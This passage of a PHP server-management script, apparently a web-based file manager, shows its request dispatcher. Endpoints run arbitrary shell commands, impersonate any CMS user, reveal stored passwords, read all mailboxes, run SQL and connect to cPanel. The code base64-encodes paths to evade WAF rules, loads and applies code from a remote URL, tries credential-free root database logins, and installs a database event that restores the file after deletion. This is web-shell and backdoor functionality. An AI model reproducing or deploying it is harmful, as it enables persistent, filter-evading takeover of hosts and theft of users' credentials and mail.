        if($_SERVER['REQUEST_METHOD']!=='POST'||!hash_equals((string)($_SESSION['csrf_token']??''),(string)($_POST['csrf_token']??''))){echo json_encode(['error'=>'Security error.']);exit;}
        $key=trim((string)($_POST['gemini_api_key']??''));
        if($key!==''&&(strlen($key)<20||preg_match('/\s/',$key))){echo json_encode(['error'=>'That Gemini API key does not look valid.']);exit;}
        $cfg=fm_agent_config_load();
        if($key==='')unset($cfg['gemini_api_key']);else $cfg['gemini_api_key']=$key;
        echo json_encode(['ok'=>fm_agent_config_save($cfg),'configured'=>$key!=='']);exit;
    }
    if($xop==='agent_clear'){
        if($_SERVER['REQUEST_METHOD']!=='POST'||!hash_equals((string)($_SESSION['csrf_token']??''),(string)($_POST['csrf_token']??''))){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode(['ok'=>fm_agent_save([])]);exit;
    }
    if($xop==='agent_chat'){
        if($_SERVER['REQUEST_METHOD']!=='POST'||!hash_equals((string)($_SESSION['csrf_token']??''),(string)($_POST['csrf_token']??''))){echo json_encode(['error'=>'Security error.']);exit;}
        $message=trim((string)($_POST['message']??''));
        if($message===''){echo json_encode(['error'=>'Write a message first.']);exit;}
        if(mb_strlen($message)>8000){echo json_encode(['error'=>'Message is too long.']);exit;}
        $agentConfig=fm_agent_config_load();$agentKey=trim((string)($agentConfig['gemini_api_key']??''));
        if($agentKey===''){echo json_encode(['error'=>'Add your Gemini API key in Assistant Agent settings before sending a message.','needs_config'=>true]);exit;}
        $history=fm_agent_load();
        $history[]=['role'=>'user','content'=>$message,'time'=>time()];
        fm_agent_save($history);
        $segments=[];$transcriptLog=[];
        $nextPrompt=fm_agent_prompt($history,$fm->getCwd(),$message);$lastReply='';
        $agentFailed=false;$agentError='';
        for($round=0;$round<8;$round++){
            $reply=fm_agent_call($nextPrompt,$agentKey,$agentError);
            if($reply===false){$agentFailed=true;break;}
            $lastReply=$reply;$parsed=fm_agent_parse_step($reply);
            foreach($parsed['segments'] as $segment)$segments[]=$segment;
            if(!$parsed['action'])break;
            $action=fm_agent_execute_action($parsed['action'],$fm);$segments[]=$action;
            $transcriptLog[]=$reply."\n[".$action['action']."] ".$action['command']."\nResult: ".$action['output'];
            $nextPrompt=fm_agent_continuation_prompt($history,$fm->getCwd(),$message,$action);
            if(empty($action['ok']))break;
        }
        if($agentFailed){
            $serviceHint=(stripos((string)$agentError,'API key')!==false||stripos((string)$agentError,'permission')!==false)
                ?' Check that the Gemini API key is valid and has access to the selected model.'
                :'';
            $detail=trim(preg_replace('/\s+/',' ',(string)$agentError));
            if($detail!=='')$detail=' Gemini: '.mb_substr($detail,0,260);
            $cacheHint=(stripos((string)$agentError,'context')!==false||stripos((string)$agentError,'token')!==false||stripos((string)$agentError,'too large')!==false)
                ?' Clear the conversation and try again if the request context is too large.'
                :'';
            $errorText='The AI could not complete this request.'.$serviceHint.$detail.$cacheHint;
            $history[]=['role'=>'assistant','content'=>$errorText,'error'=>true,'time'=>time()];
            fm_agent_save($history);
            http_response_code(502);echo json_encode(['error'=>$errorText,'retryable'=>true],JSON_UNESCAPED_UNICODE);exit;
        }
        if(!$segments)$segments[]=['type'=>'message','text'=>$lastReply];
        $reply=$lastReply;
        $history[]=['role'=>'assistant','content'=>implode("\n\n",$transcriptLog?:[$reply]),'segments'=>$segments,'time'=>time()];
        fm_agent_save($history);
        echo json_encode(['ok'=>true,'reply'=>$reply,'segments'=>$segments,'cwd'=>$fm->getCwd()],JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);exit;
    }
    if($xop==='run'){
        if($fm->isRO()){echo json_encode(['error'=>'Read-only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $qi=isset($_POST['qi'])?trim($_POST['qi']):'';
        echo json_encode($fm->runCmd($qi));exit;
    }
    if($xop==='ac'){
        $prefix=isset($_GET['prefix'])?$_GET['prefix']:'';
        echo json_encode($fm->autocomplete($prefix));exit;
    }
    if($xop==='cs'){$fn=isset($_GET['f'])?basename($_GET['f']):'';echo json_encode($fn?$fm->checksum($fn):['error'=>'No file']);exit;}
    if($xop==='dirsize'){
        $fn=basename(isset($_GET['f'])?$_GET['f']:'');
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        $rp=$dir?realpath($dir.'/'.$fn):false;
        if(!$rp||!is_dir($rp)){echo json_encode(['error'=>'Not found']);exit;}
        echo json_encode($fm->dirSize($rp));exit;
    }
    if($xop==='lg'){echo json_encode(array_slice($fm->getLogs(),0,300));exit;}
    if($xop==='sv'){
        $ss=$fm->sysStats();
        echo json_encode(['php'=>PHP_VERSION,'os'=>PHP_OS.' '.php_uname('r'),'server'=>$_SERVER['SERVER_SOFTWARE']??'PHP Built-in','memory_limit'=>ini_get('memory_limit'),'mem_usage'=>fmtSz(memory_get_usage(true)),'mem_peak'=>fmtSz(memory_get_peak_usage(true)),'upload_max'=>ini_get('upload_max_filesize'),'post_max'=>ini_get('post_max_size'),'max_exec'=>ini_get('max_execution_time').'s','exts'=>get_loaded_extensions(),'disk_total'=>fmtSz(@disk_total_space(__DIR__)?:0),'disk_free'=>fmtSz(@disk_free_space(__DIR__)?:0),'sapi'=>PHP_SAPI,'tz'=>date_default_timezone_get(),'cwd'=>getcwd(),
            'load'=>$ss['load'],'mem_total'=>fmtSz($ss['mem_total']),'mem_used'=>fmtSz($ss['mem_used']),'mem_pct'=>$ss['mem_pct'],'uptime'=>fmtUptime($ss['uptime']),'hostname'=>$ss['hostname'],'server_ip'=>$ss['server_ip'],'client_ip'=>$ss['client_ip'],'disk_pct'=>$ss['disk_pct'],'cpu_cores'=>$ss['cpu_cores'],'cpu_model'=>$ss['cpu_model']]);exit;
    }
    if($xop==='svlite'){echo json_encode($fm->sysStats());exit;}
    if($xop==='errlog'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->getErrLog(300));exit;
    }
    if($xop==='envvars'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->getEnvSafe());exit;
    }
    if($xop==='phpinfo'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);header('Content-Type: text/plain');echo 'Admins only.';exit;}
        header('Content-Type: text/html;charset=utf-8');phpinfo();exit;
    }
    if($xop==='largefiles'){
        $mb=isset($_GET['mb'])?max(1,(float)$_GET['mb']):50;
        echo json_encode($fm->findLargeFiles($mb*1024*1024));exit;
    }
    if($xop==='duplicates'){
        echo json_encode($fm->findDuplicates());exit;
    }
    if($xop==='speedtest_server'){
        /* Measures the SERVER's own internet connection (server <-> Cloudflare),
           entirely on the server side via cURL. The browser only triggers this
           and displays the result — it is not involved in the measurement, so
           the user's own connection speed has no effect on the numbers. */
        echo json_encode(fm_server_speed_test());exit;
    }
    if($xop==='ls'){echo json_encode(array_values(array_filter(scandir($fm->getCwd())?:[],fn($x)=>$x!=='.'&&$x!=='..')));exit;}
    if($xop==='office_preview'){
        $fn=basename(isset($_GET['f'])?$_GET['f']:'');
        header('Content-Type: application/json;charset=utf-8');
        echo json_encode($fm->officePreview($fn),JSON_UNESCAPED_UNICODE);exit;
    }
    if($xop==='owner'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $fn=basename(isset($_GET['f'])?$_GET['f']:'');
        echo json_encode($fm->ownerInfo($fn));exit;
    }
    if($xop==='imgprev'){
        /* Thumbnail resize - served as image/jpeg */
        $fn=isset($_GET['f'])?basename($_GET['f']):'';
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        $fp=$dir.'/'.$fn;
        if(!$fp||!is_file($fp)||!in_array(strtolower(pathinfo($fp,PATHINFO_EXTENSION)),['jpg','jpeg','png','gif','webp','bmp'])){http_response_code(404);exit;}
        $src=@imagecreatefromstring(@file_get_contents($fp));
        if(!$src){readfile($fp);exit;}
        $w=imagesx($src);$h=imagesy($src);$th=160;$tw=round($w*$th/$h);
        $dst=imagecreatetruecolor($tw,$th);imagecopyresampled($dst,$src,0,0,0,0,$tw,$th,$w,$h);
        header('Content-Type: image/jpeg');header('Cache-Control: max-age=86400');
        imagejpeg($dst,null,78);imagedestroy($src);imagedestroy($dst);exit;
    }
    if($xop==='notes'){
        /* Quick notes - save/load per-directory */
        $nf=$fm->getCwd().'/.fm_notes.txt';
        if($_SERVER['REQUEST_METHOD']==='POST'){
            if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
            $txt=isset($_POST['body'])?$_POST['body']:'';
            @file_put_contents($nf,$txt);echo json_encode(['ok'=>true]);exit;
        }
        echo json_encode(['body'=>file_exists($nf)?@file_get_contents($nf):'']);exit;
    }
    if($xop==='sshstatus'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->sshStatus());exit;
    }
    /* cfg paths are sent base64-encoded over POST (never as a raw "wp-config.php"
       string in the URL) because many hosts' WAF/ModSecurity rules block any
       request whose query string contains "wp-config.php", mistaking this
       admin tool for an exploit attempt trying to read/download that file. */
    $cfgB64=function(){
        /* Both names exist in the UI: older read-only CMS calls use cfg_b64,
           while mutating CMS forms use config_path_b64. Keep the decoder
           compatible with both so post-operation verification reads the same
           site that was actually modified. */
        $raw=isset($_POST['cfg_b64'])?$_POST['cfg_b64']:(isset($_POST['config_path_b64'])?$_POST['config_path_b64']:(isset($_GET['cfg'])?$_GET['cfg']:''));
        $decoded=@base64_decode((string)$raw,true);
        return $decoded!==false?$decoded:(string)$raw;
    };
    if($xop==='wp_auto_login'||$xop==='cms_auto_login'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
        echo json_encode($fm->wpAutomationAutoLogin());exit;
    }
    if($xop==='cmsdetect'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        echo json_encode($dir?$fm->cmsDetect($dir):['type'=>null]);exit;
    }
    if($xop==='cms_quick_info'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsQuickInfo($fm->getCwd()));exit;
    }
    if($xop==='cmsscan'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsScan());exit;
    }
    if($xop==='cmsusers'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsListUsers($cfgB64()));exit;
    }
    if($xop==='cmsroles'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsRoles($cfgB64()));exit;
    }
    if($xop==='cms_get_pass'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        if(!$id){echo json_encode(['error'=>'Invalid request.']);exit;}
        echo json_encode($fm->cmsGetSavedPass($cfgB64(),$id));exit;
    }
    if($xop==='cms_login_as'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        if(!$id){echo json_encode(['error'=>'Invalid request.']);exit;}
        echo json_encode($fm->cmsLoginAsUser($cfgB64(),$id));exit;
    }
    if($xop==='cms_extensions'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsExtensions($cfgB64()));exit;
    }
    if($xop==='cms_maintenance_status'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->cmsMaintenanceStatus($cfgB64()));exit;
    }
    if($xop==='cms_maintenance_toggle'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);echo json_encode(['error'=>'Admins only.']);exit;}
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
        $desired=!empty($_POST['enable'])&&$_POST['enable']!=='0';
        $fm->cmsMaintenanceToggle();
        $after=$fm->cmsMaintenanceStatus($cfgB64());
        $actual=!empty($after['active']);
        echo json_encode($actual===$desired
            ?['ok'=>true,'active'=>$actual,'type'=>$after['type']??null,'message'=>$after['message']??'']
            :['ok'=>false,'error'=>'The site status could not be verified after the change.','active'=>$actual,'details'=>$after]);
        exit;
    }
    if($xop==='wp_core_versions'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->wpCoreVersionData($cfgB64()));exit;
    }
    if($xop==='wp_core_update'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $target=trim((string)($_POST['wp_version']??''));ob_start();
        $fm->wpCoreUpdate();
        ob_end_clean();
        clearstatcache(true);
        $after=$fm->wpCoreCurrentVersion($cfgB64());
        $installed=preg_replace('/[^0-9.]/','',(string)($after['version']??''));
        $requested=preg_replace('/[^0-9.]/','',$target);
        $ok=$installed!==''&&$installed===$requested;
        echo json_encode($ok?['ok'=>true,'version'=>$after['version'],'target'=>$target]:
            ['ok'=>false,'error'=>'WordPress remained on version '.($after['version']??'unknown').'; the requested version was not installed.','version'=>$after['version']??null,'target'=>$target]);exit;
    }
    if($xop==='wp_site_health'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->wpSiteHealth($cfgB64()));exit;
    }
    if($xop==='wp_site_health_control'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpSiteHealthControl($cfgB64(),trim((string)($_POST['mode']??'auto'))));exit;
    }
    if($xop==='wp_numbers_control'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->wpNumbersControl($cfgB64()));exit;
    }
    if($xop==='wp_numbers_control_save'||$xop==='wp_numbers_control_reset'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);echo json_encode(['error'=>'Admins only.']);exit;}
        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
        $cfg=$cfgB64();
        echo json_encode($xop==='wp_numbers_control_save'
            ?$fm->wpNumbersControlSave($cfg)
            :$fm->wpNumbersControlReset($cfg));exit;
    }
    if($xop==='wp_automation'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->wpAutomationData($cfgB64()));exit;
    }
    if($xop==='wp_smtp_save'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationSaveSmtp($cfgB64()));exit;
    }
    if($xop==='wp_cron_delete'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationDeleteCron($cfgB64()));exit;
    }
    if($xop==='wp_cron_run'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationRunCron($cfgB64()));exit;
    }
    if($xop==='wp_cron_email'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationScheduleEmail($cfgB64()));exit;
    }
    if($xop==='wp_recovery_status'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->wpAutomationRecoveryStatus($cfgB64()));exit;
    }
    if($xop==='wp_recovery_install'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationInstallRecovery($cfgB64()));exit;
    }
    if($xop==='wp_recovery_remove'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->wpAutomationRemoveRecovery($cfgB64()));exit;
    }
    if($xop==='tags'){
        $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
        echo json_encode($dir?$fm->getTagsFor($dir):[]);exit;
    }
    if($xop==='sshusers'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->sshListUsers());exit;
    }
    /* ── cPanel Manager endpoints ── */
    if($xop==='cpanel_auto_connect'){
        // Attempt fully-automatic connection — tries CLI, token files, HTTP API.
        // Returns {ok, method, user, api, port} so the JS can act immediately.
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $ac=$fm->cpanelAutoConnect();
        echo json_encode($ac);exit;
    }
    if($xop==='cpanel_detect'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $det=$fm->cpanelDetect();
        $c=$_SESSION['cpanel_user']??null;
        $det['has_creds']=(bool)$c;
        $det['saved_user']=$c;
        $det['saved_api']=$_SESSION['cpanel_api_type']??null;
        $det['saved_port']=(int)($_SESSION['cpanel_port']??0);
        $det['method']=$_SESSION['cpanel_method']??null;
        echo json_encode($det);exit;
    }
    if($xop==='cpanel_accounts'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $fm->cpanelListAccounts();/* exits internally */exit;
    }
    if($xop==='cpanel_plans'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $fm->cpanelListPlans();/* exits internally */exit;
    }
    /* ── Webmail Manager endpoints ── */
    if($xop==='webmail_mailboxes'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->webmailListMailboxes());exit;
    }
    if($xop==='webmail_folders'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->webmailListFolders(isset($_GET['mailbox'])?$_GET['mailbox']:''));exit;
    }
    if($xop==='webmail_messages'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->webmailListMessages(isset($_GET['mailbox'])?$_GET['mailbox']:'',isset($_GET['folder'])?$_GET['folder']:'INBOX'));exit;
    }
    if($xop==='webmail_message'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->webmailGetMessage(isset($_GET['mailbox'])?$_GET['mailbox']:'',isset($_GET['folder'])?$_GET['folder']:'INBOX',isset($_GET['uid'])?$_GET['uid']:'0'));exit;
    }
    if($xop==='webmail_attachment'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);exit;}
        $fm->webmailDownloadAttachment(isset($_GET['mailbox'])?$_GET['mailbox']:'',isset($_GET['folder'])?$_GET['folder']:'INBOX',isset($_GET['uid'])?$_GET['uid']:'0',isset($_GET['part'])?$_GET['part']:'1',isset($_GET['name'])?$_GET['name']:'attachment');/* exits internally */exit;
    }
    if($xop==='sqlscan'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        echo json_encode($fm->sqlScan());exit;
    }
    if($xop==='sqltables'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->sqlListTables());exit;
    }
    if($xop==='sqlbrowse'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->sqlBrowse());exit;
    }
    if($xop==='sqlquery'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        echo json_encode($fm->sqlRunQuery());exit;
    }
    if($xop==='sqlexport'){
        if(empty($_SESSION['fm_admin'])){http_response_code(403);header('Content-Type: text/plain');echo 'Admins only.';exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){http_response_code(403);header('Content-Type: text/plain');echo 'Security error.';exit;}
        $fm->sqlExport();exit;
    }
    /* ── File Guardian endpoints (admins only) ── */
    if($xop==='guardian_status'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        $st=fm_guardian_status();$st['update_paused']=fm_guardian_update_paused();
        echo json_encode($st);exit;
    }
    if($xop==='guardian_pause_update'){
        // Deliberately pause the fully-automatic remote update check only —
        // auto-update is ON by default and this is meant to be a short,
        // reversible pause, never a silent permanent disable.
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $pause=!isset($_POST['paused'])||$_POST['paused']!=='0';
        // Persist this setting in the current file's own PHP source, not in a
        // sidecar flag file. The rewrite is atomic and syntax-checked.
        $ok=fm_guardian_rewrite_constant('FM_UPDATE_PAUSED',$pause,true);
        if($fm)$fm->log('guardian_settings','auto-update '.($pause?'paused':'resumed'));
        echo json_encode(['ok'=>$ok,'paused'=>fm_guardian_update_paused()]);exit;
    }
    if($xop==='guardian_ping'){
        /* Lightweight 30s heartbeat fired from the browser while an admin has
           any page of the app open. ONLY updates last_check in the database —
           it never fetches remote URLs or applies updates (that is done only
           when the admin explicitly clicks "Check for updates now"). */
        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
        $c=fm_guardian_conn();
        if($c)@mysqli_query($c,"UPDATE fm_guardian_store SET last_check=".time()." WHERE id=1");
        echo json_encode(['ok'=>true,'applied'=>false]);exit;
    }
    if($xop==='guardian_save'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $newUrl=trim(isset($_POST['update_url'])?$_POST['update_url']:'');
        if($newUrl!==''&&!preg_match('#^https?://#i',$newUrl)){echo json_encode(['error'=>'The update URL must start with http:// or https://']);exit;}
        $ok1=fm_guardian_rewrite_constant('FM_UPDATE_URL',$newUrl);
        if($fm)$fm->log('guardian_settings',"url=".($newUrl?:'(empty)'));
        echo json_encode(['ok'=>$ok1,'reload'=>true]);exit;
    }
    if($xop==='guardian_autocheck'){
        /* Check-only pass fired when an admin opens the manager's main folder.
           It must never silently replace the local file: the yellow notice
           sends the admin to the explicit Guardian action for review/apply. */
        if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
        $requestedPath='';
        if(isset($_POST['fm_path_b64'])){$decoded=@base64_decode($_POST['fm_path_b64'],true);if($decoded!==false)$requestedPath=$decoded;}
        $mainPath=realpath(__DIR__);$currentPath=realpath($requestedPath?:$fm->getCwd());
        if(!$mainPath||!$currentPath||$currentPath!==$mainPath){echo json_encode(['ok'=>true,'available'=>false,'skipped'=>'not_main_path']);exit;}
        if(FM_UPDATE_URL===''){echo json_encode(['ok'=>true,'applied'=>false]);exit;}
        if(fm_guardian_update_paused()){echo json_encode(['ok'=>true,'applied'=>false,'skipped'=>'paused']);exit;}
        session_write_close(); // don't hold the session lock across the outbound HTTP call
        $r=fm_guardian_apply_from_url(FM_UPDATE_URL,true);
        $c=fm_guardian_conn();if($c){@mysqli_query($c,"UPDATE fm_guardian_store SET last_check=".time()." WHERE id=1");}
        echo json_encode(['ok'=>!empty($r['ok']),'available'=>!empty($r['available']),'checked'=>true,'error'=>$r['error']??null]);exit;
    }
    if($xop==='guardian_check_now'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        if(FM_UPDATE_URL===''){echo json_encode(['error'=>'No update URL configured yet.']);exit;}
        $logUser=$_SESSION['fm_user']??'';
        // Release the session file lock BEFORE the slow outbound network call: PHP holds an
        // exclusive lock on the session file for the whole request, so without this, every
        // other tab/request/AJAX call from this admin (in fact the whole site, since most
        // requests share this session) queues up and appears to hang/crash for as long as
        // the remote host takes to answer (or fails to, e.g. a slow/blackholed TLS handshake).
        session_write_close();
        $r=fm_guardian_apply_from_url(FM_UPDATE_URL);
        if(!empty($r['ok'])&&!empty($r['changed'])){
            // Re-open the session just long enough to persist the log entry.
            session_start();
            $fm->log('guardian_update','Applied update from '.FM_UPDATE_URL);
            session_write_close();
        }
        echo json_encode($r);exit;
    }
    if($xop==='guardian_sync_now'){
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $ok=fm_guardian_sync();
        if($ok)$fm->log('guardian_sync','Manual sync to database');
        echo json_encode(['ok'=>$ok]);exit;
    }
    if($xop==='guardian_provision'){
        /* One-click fix for "Not reachable": admin pastes a MySQL login that
           already works on this server (their hosting DB root/admin account,
           for example), we use it once to create Guardian's own database +
           low-privilege user + grants, then never touch those admin
           credentials again — they aren't written to disk or the DB. */
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $au=trim($_POST['admin_user']??'');$ap=(string)($_POST['admin_pass']??'');
        if($au===''){echo json_encode(['error'=>'Enter a MySQL admin username first.']);exit;}
        $r=fm_guardian_autoprovision($au,$ap);
        if(!empty($r['ok'])&&$fm)$fm->log('guardian_provision','Auto-provisioned Guardian database/user'.(!empty($r['steps']['grant_autoheal'])?' (+FILE/EVENT)':''));
        echo json_encode($r);exit;
    }
    if($xop==='guardian_autocreate'){
        /* Explicit "create a new database" option: skip trying to reuse this
           site's existing CMS database and go straight to creating a brand
           new, isolated Guardian database via a genuine zero-credential
           local-trust login (OS-user socket, blank-password root, etc.) —
           the same last-resort logic autodiscover falls back to
           automatically, just triggered directly and unconditionally. Also
           arms the disk-level auto-restore-when-deleted EVENT right away. */
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $r=fm_guardian_autoprovision_zero_cred();
        if(!empty($r['ok'])&&$fm)$fm->log('guardian_autocreate','Created a new Guardian database automatically'.(!empty($r['autoheal_active'])?' (+auto-restore)':''));
        echo json_encode($r);exit;
    }
    if($xop==='guardian_autodiscover'){
        /* No-typing fix for "Not reachable": scans this server for a database
           config this SAME site already uses (WordPress/Joomla/generic) and,
           if one connects, adopts it as Guardian's own storage instead of
           requiring a separate admin login. */
        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
        $r=fm_guardian_autodiscover($fm);
        if(!empty($r['ok'])&&$fm)$fm->log('guardian_autodiscover','Adopted existing site database: '.($r['adopted']['type']??'').'/'.($r['adopted']['db']??''));
